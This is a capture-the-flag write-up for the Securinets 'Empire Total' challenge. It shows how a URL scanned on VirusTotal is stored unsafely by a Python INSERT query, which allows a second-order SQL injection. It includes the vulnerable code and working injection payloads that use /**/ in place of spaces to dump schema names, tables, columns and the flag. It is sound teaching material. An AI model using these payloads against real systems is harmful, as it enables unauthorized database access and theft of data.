# **Empire Total (1000pts) (7 Solves)**

![TASK](https://imgur.com/rGcoI7o.png)

This task was really so creative and i had so fun solving it , but i can't deny that it was painful :( after reading the description we can say that we aim to dump the database of the website (maybe SQL injection who knows) and fortunately we have the source code so let's download it and begin our trip xD

After Visiting the website we find a tool based on Virus Total API , understanding the functionality of the website is really necessary for solving the task, we will cover it in details later, but as a first thought we give an ip address to the website and it will shows Virus Total stats about it

![TASK](https://imgur.com/k7ScCjX.png)

![TASK](https://imgur.com/bjRXPJT.png)

After cloning the project here is its structure
> git clone https://github.com/mohamedaymenkarmous/virustotal-api-html

![TASK](https://imgur.com/alxzV41.png)

let's take a look at index.php , since the code is really too long i will only put the important parts, as we can see after some configurations and Recaptcha setting, all the SQL queries are prepared statements so there is no way to perform SQL injection but we can notice the execution of the 
**shell_exec** function :D Interesting hmmm 

![TASK](https://imgur.com/A1kiMAa.png)

**shell_exec** is executing some python script with a scanned ip argument ,maybe manipulating it will give us something useful 

```php
$command = "../VirusTotal.py '$scanned_ip'";
$output = shell_exec($command);
```
But unfortunately there's too much restriction on our input :( it's impossible to bypass the filter_var here and the JS restrictions (if you can bpass it just tell me xD )

```php
 if(isset($_POST) && !empty($_POST)){
  $scanned_ip=isset($_POST['ip']) && !empty($_POST['ip'])  && !is_array($_POST['ip']) ? $_POST['ip'] : "";
  if(!$scanned_ip){header("Location: /?invalid_ip");exit();}
  if (filter_var($scanned_ip, FILTER_VALIDATE_IP)) {
  } else {header("Location: /?invalid_ip");exit();}
```
Let's proceed , it seems that the index.php is pretty safe ,let's take a look at the VirusTotal.py script 

![TASK](https://imgur.com/ytcYYQQ.png)

OMG :'( 499 lines , that was so discouraging @Emperors :( anyway after scrolling around and reading the code , we can somehow understand the behaviour of the website,
when we enter the ip address it asks the Virus Total API for the results and then there's the persistence functionality that saves the results in the database and then when we enter the same ip address again it will loads
the results from the database .

So if we can control the results maybe we will have the opportunity to perform an SQL injection ? I got stuck in this part for a long time and after the help of the admin ( Thank you @Emperors <3 ) i found something interesting :D

before we proceed here's a vulnerable function to SQL injection that saves the results of urls section in the database (line 417 in VirusTotal.py)

```python
  def persistURLs(self,selected_ips,ip_report_filtered):
    attr="detected_urls"
    table_name="vt_scanned_urls_table"
    newAttr=self.AttrSubstitution[attr] if attr in self.AttrSubstitution else attr
    selected_urls=self.findPersistedIP(selected_ips[0]['id'],table_name)
    selected_urls_filtered=[]
    for selected_url in selected_urls:
      selected_urls_filtered.append(selected_url['url'])
    if newAttr in ip_report_filtered:
     for url in ip_report_filtered[newAttr]:
      print(url['URL'])
      if url['URL'] not in selected_urls_filtered:
        try:
          self.CursorRW.execute("INSERT INTO "+table_name+" (ip_id,url,detections,scanned_time) VALUES ('"+str(selected_ips[0]['id'])+"','"+url['URL']+"','"+url['Detections']+"','"+url['Scanned']+"')")
          self.DBRW.commit()
          self.resetSQL()
        except Exception as e:
          print("INSERT INTO "+table_name+" (ip_id,url,detections,scanned_time) VALUES ('"+str(selected_ips[0]['id'])+"','"+url['URL']+"','"+url['Detections']+"','"+url['Scanned']+"')")
          print("EXCEPTION: ",e)
          self.resetSQL()
```
## Exploitation ##

So the idea is that if we go to VirusTotal website (https://www.virustotal.com/) and scan a url ,and then go back to our challenge website and scan the url's ip
we will find that the url we scanned in VirusTotal website will appear , it's pretty confusing i know so let's have an example

1. We go to Virus Total website and scan for any url for example :( in my case i launched a web server on my VPS and used it here )

> http://100.26.206.184/?u=Just testing for the writeup :p

![TASK](https://imgur.com/mGOQ1tQ.png)

2. Now we go back to the challenge website and scan the ip address

![TASK](https://i.imgur.com/N7ymSRT.jpg)

Yeeees ! it's appearing in the results so we now have the control over these values in the urls section of the results.

Now here is our scenario , if we look to the vulnerable function **persistURLs** in VirusTotal.py we can notice the injection in this query (line 430)

> INSERT INTO "+table_name+" (ip_id,url,detections,scanned_time) VALUES ('"+str(selected_ips[0]['id'])+"','"+url['URL']+"','"+url['Detections']+"','"+url['Scanned']+"')

We have control over the **url['URL']** parameter (the url we scan in VirusTotal Website) so it's now an SQL injection in INSERT INTO values, but we have some constraints :

1. The url encoding **%20** that will be interpreted with the SQL query so we have to find another way in our payload instead of white spaces which is a well known bypass:  **/\*\*/**
2. The second thing faced me when i was solving the challenge , we can't use **-- -** to equilibrate the SQL query so we will have to find a solution to equilibrate it

In order to test the injection locally i have created this small script that connects to my local DB and executes the same query, you can find it **[HERE](https://github.com/expressjs/express/issues/1824)** 

Finally I opted to this solution, here is the URL we will scan :
> http://100.26.206.184/?u=',(select/**/1),(select/**/2)),('102','a

The complete SQL query that will be executed is  :
> INSERT INTO detected_urls (ip_id,url,detections,scanned_time) VALUES ('2','100.26.206.184/?u=',(select 1),(select 2)),('102','a','15','yes')

Let's try it now , we first scan it in VirusTotal :

![TASK](https://imgur.com/3L7lmrs.png)

And now let's scan the IP in the challenge website  :

![TASK](https://imgur.com/f2CRd7H.png)

It's fetched successfully, let's scan the ip another time now to check if our injection succeeded or not, we must see 1,2 in the output :

![TASK](https://i.imgur.com/U3SEcaV.jpg)

Bingo ! our injection worked , we only have to dump the entire Database now and repeat the same procedure:

1. Dump DB names :

> http://100.26.206.184/?u=',(select/**/gRoUp_cOncaT(0x7c,schema_name,0x7c)/**/fRoM/**/information_schema.schemata),(select/**/2)),('102','a

![TASK](https://imgur.com/AJvdMXB.png)

DBName : MySecretDatabase 

2. Dump Tables and Columns :

> http://100.26.206.184/?u=',(select/**/gRoUp_cOncaT(0x7c,table_name,0x7c)/**/fRoM/**/information_schema.tables),(select/**/2)),('102','a

> http://100.26.206.184/?u=',(select/**/gRoUp_cOncaT(0x7c,column_name,0x7c)/**/fRoM/**/information_schema.columns),(select/**/2)),('103','a

![TASK](https://imgur.com/raYuUmI.png)

**Table Name** : SecretTable & **Column Name** : secret_value

3. And finally let's have our beloved flag :

> http://100.26.206.184/?u=',(select/**/group_concat(0x7c,secret_value,0x7c)/**/fRoM/**/MySecretDatabase.SecretTable),(select/**/2)),('109','a

![TASK](https://imgur.com/FanWbUZ.png)

Yees We did it , **FLAG** : Securinets{EmpireTotal_Pwn3D_fr0m_Th3_0th3r_S1de}

I have really liked the idea of the challenge, it's really creative , i want to thanks Securinets technical team for these fun tasks and awesome CTF and of course the author @TheEmperors.

I hope you liked the writeup if you have any questions don't hesitate to contact me **Twitter** : @BelkahlaAhmed1 
